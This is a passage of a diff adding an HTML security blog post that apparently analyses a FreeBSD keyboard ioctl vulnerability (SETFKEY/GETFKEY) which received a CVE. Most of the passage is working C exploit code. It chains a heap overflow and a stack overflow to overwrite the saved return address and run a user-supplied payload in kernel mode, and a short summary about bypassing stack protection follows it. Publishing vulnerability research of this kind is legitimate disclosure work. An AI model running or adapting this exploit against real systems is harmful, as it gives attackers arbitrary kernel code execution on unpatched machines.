+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &amp;ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void payload(void) {
+	kprintf("  [+] Entered kernel payload\n");
+	
+	strcpy(ostype, "CTurt  ");
+	
+	__asm__ volatile("swapgs; sysret");
+}
+
+// Copy the stack onto the heap
+void heapOverflow(int index, size_t size) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = size;
+	memset(&amp;fkey.keydef, 0, 16);
+	
+	ioctl(0, SETFKEY, &amp;fkey);
+}
+
+// Copy the heap onto the stack
+void stackOverflow(int index) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 0, 16);
+	
+	ioctl(0, GETFKEY, &amp;fkey);
+}
+
+int main(void) {
+	int result, i;
+	fkeyarg_t fkey;
+	
+	uint32_t ripLower4 = 0x808312cd; // jmp rbp
+	uint64_t rbp = (uint64_t)payload;
+	
+	
+	kprintf = resolve("printf");
+	ostype = resolve("ostype");
+	
+	
+	printf("  [+] Set full length for key 10\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	
+	printf("  [+] Set bad length and perform heap overflow\n");
+	heapOverflow(0, 128 - offsetof(fkeyarg_t, keydef) + 8 + 0x30 + sizeof(ripLower4));
+	
+	
+	printf("  [+] Prepare stack overflow memory\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, GETFKEY, &amp;fkey);
+	originalRbp = *(uint64_t *)((char *)&amp;fkey.keydef + 4);
+	originalRip = 0xffffffff00000000 | *(uint32_t *)((char *)&amp;fkey.keydef + 12);
+	
+	printf("  [+] Original rip: %#lx\n", originalRip);
+	printf("  [+] Original rbp: %#lx\n", originalRbp);
+	
+	*(uint64_t *)((char *)&amp;fkey.keydef + 4) = rbp;
+	*(uint32_t *)((char *)&amp;fkey.keydef + 12) = ripLower4;
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	
+	printf("  [+] Trigger stack overflow\n");
+	fflush(stdout);
+	
+	stackOverflow(0);
+	
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<div class="center">
+					<img src="images/FreeBSD/SETFKEY.png" />
+				</div>
+				
+				<br>
+				
+				<h2>Summary</h2>
+				<p>
+					This bug is very special for me because it is the first bug I have reported which was serious enough to be assigned a CVE. It was also really fun to analyse because it lead to such a powerful stack control primitive, and wasn't too difficult to gain arbitrary kernel code execution from.
+				</p>
+				
+				<p>
+					In the future, I hope to analyse other methods of bypassing the stack protector, to enable exploitation of stack overflow vulnerabilities which are more limited, like the <a href="https://bugs.freebsd.org/bugzilla/show_bug.cgi?id=206761#c0"><code>kern.binmisc.add</code> vulnerability</a>. For example, in the past this has been possible due to FreeBSD's implementation of arc4random <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-08:11.arc4random.asc">having a lack of entropy</a>.
+				</p>
+			</div>
+		</div>
+	</body>
+</html>
